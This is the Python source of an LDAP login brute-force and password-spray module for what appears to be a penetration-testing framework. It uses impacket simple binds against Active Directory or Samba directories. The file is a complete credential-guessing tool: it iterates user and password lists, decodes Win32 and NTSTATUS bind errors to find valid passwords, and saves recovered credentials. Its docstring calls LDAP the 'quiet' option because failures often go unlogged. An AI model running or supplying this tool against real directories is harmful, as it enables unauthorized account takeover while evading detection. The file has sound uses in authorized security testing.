"""LDAP login brute force / spray (impacket simple bind).

The quiet AD validator: a simple bind answer is authoritative — and unlike
SMB, LDAP failures don't populate the security log on most default
configs. Bind answers worth distinguishing:

  - wrong password              -> fail (the common case)
  - password expired/must change -> VALID password (counted good)
  - account disabled            -> valid password, dead account
  - account locked out          -> stop: lockout policy is live

Windows DCs embed the reason as a Win32 subcode ("data 52e"); Samba names
the NTSTATUS instead ("NT_STATUS_LOGON_FAILURE"). The classifier reads
both. Lockout and dead-host circuit breakers match smb_login.
"""

import re
import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptInt, OptPort, OptString
from core.wordlists import build_combos, creds_from_options

try:
    from impacket.ldap import ldap as impacket_ldap
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

ERROR_CIRCUIT = 3  # consecutive transport errors before a host is skipped

# Win32 subcodes in the bind error string ("data 52e")
WIN32_CODES = {
    0x52E: ("fail", "wrong password"),
    0x52F: ("fail", "logon restriction (workstation/time)"),
    0x530: ("fail", "logon time restriction"),
    0x531: ("fail", "workstation restriction"),
    0x532: ("success", "valid, password expired"),
    0x533: ("fail", "valid password, account disabled"),
    0x701: ("fail", "account expired"),
    0x773: ("success", "valid, must change password"),
    0x775: ("locked", "account locked out"),
}
# Samba names NTSTATUS instead of the subcode
NTSTATUS_CODES = {
    "NT_STATUS_LOGON_FAILURE": ("fail", "wrong password"),
    "NT_STATUS_PASSWORD_EXPIRED": ("success", "valid, password expired"),
    "NT_STATUS_PASSWORD_MUST_CHANGE": ("success", "valid, must change password"),
    "NT_STATUS_ACCOUNT_DISABLED": ("fail", "valid password, account disabled"),
    "NT_STATUS_ACCOUNT_LOCKED_OUT": ("locked", "account locked out"),
}

_DATA_RE = re.compile(r"data ([0-9a-fA-F]+)")


def classify_bind_error(message):
    """LDAP bind error string -> (verdict, note)."""
    m = _DATA_RE.search(message)
    if m:
        code = int(m.group(1), 16)
        if code in WIN32_CODES:
            return WIN32_CODES[code]
    for name, verdict in NTSTATUS_CODES.items():
        if name in message:
            return verdict
    return "fail", message[:60]


class LdapLogin(AuxiliaryModule):
    name = "LDAP Login Brute Force"
    description = """
        Tries username/password combinations as LDAP simple binds against
        a directory (AD DC or any LDAP). DOMAIN is the user-principal
        domain (forge.local -> user@forge.local). Expired/must-change
        passwords count as VALID. ACCOUNT_LOCKED_OUT or a dead host
        circuit-breaks the remaining attempts. Stored creds for the host
        are tried first.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=389, description="LDAP port"))
        self.options.add(OptString("DOMAIN", default="",
                                   description="User principal domain, e.g. forge.local "
                                               "(blank = bare usernames)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username(s), comma-separated"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptInt("THREADS", default=2,
                                description="Concurrent attempts (keep low: lockouts)"))
        self.options.add(OptInt("TIMEOUT", default=5,
                                description="Worker drain timeout (binds themselves "
                                            "use impacket's socket defaults)"))

    def _try(self, host, port, timeout, domain, state, user, password):
        """One simple bind -> success | fail | error; lockout/dead-host
        circuit breakers live in state."""
        if state["abort"]:
            return None
        try:
            # impacket's LDAPConnection IGNORES URL ports (a port in the
            # URL becomes part of the hostname and fails DNS) — it speaks
            # 389, always. run() refuses other ports up front.
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
            return "success", "valid"
        except Exception as e:
            message = str(e)
            lowered = message.lower()
            if any(k in lowered for k in ("timed out", "refused",
                                          "unreachable", "connection error",
                                          "name or service")):
                state["errors"] += 1
                if state["errors"] >= ERROR_CIRCUIT:
                    state["abort"] = True
                    state["dead"] = message
                self.print_debug(f"{host}:{port} {user} -> transport: {e}")
                return "error", message
            verdict, note = classify_bind_error(message)
            if verdict == "locked":
                state["abort"] = True
                state["locked"] = user
            self.print_debug(f"{host}:{port} {user}:{password} -> {note}")
            return verdict, note

    def run(self):
        try:
            raw_users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        # usernames comma-split (sprays need lists inline); passwords never
        # do — commas are legal password characters
        users = [u.strip() for v in raw_users for u in v.split(",") if u.strip()]
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE)")
            return

        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} password(s) = "
            f"{len(combos)} combinations")
        port = int(self.get_option("RPORT"))
        if port != 389:
            self.print_error("impacket's LDAP client speaks port 389 only "
                             "(URL ports are ignored) — tunnel/forward "
                             "other ports to 389 first")
            return
        timeout = int(self.get_option("TIMEOUT"))
        domain = str(self.get_option("DOMAIN") or "")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, port, timeout, domain, combos)

    def _attack_host(self, host, port, timeout, domain, combos):
        store = getattr(self.framework, "store", None)
        if store is not None:
            stored = store.creds_for(host, "ldap")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first")
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        state = {"abort": False, "errors": 0, "locked": None, "dead": None}
        attempt = lambda u, p: self._try(host, port, timeout, domain,  # noqa: E731
                                         state, u, p)
        classify = lambda verdict: verdict[0] if verdict[0] != "locked" else "error"  # noqa: E731

        def on_success(combo, result):
            note = f" ({result[1]})" if result[1] != "valid" else ""
            self.print_good(f"{host}: valid credential "
                            f"{combo[0]}:{combo[1]}{note}")

        started = time.time()
        found, attempts, errors, possibles = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        if state["locked"]:
            self.print_warning(
                f"{host}: ACCOUNT_LOCKED_OUT on {state['locked']} — "
                f"remaining combos skipped (lockout policy is live)")
        if state["dead"]:
            self.print_warning(
                f"{host}: {ERROR_CIRCUIT} consecutive transport errors — "
                f"host skipped")
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors")

        if store is not None and found:
            store.add_service(host, port, name="ldap")
            for user, pw in found:
                store.add_cred(host, "ldap", user, pw, source="ldap-brute")
                self.print_status("Credential saved ('creds' to view)")
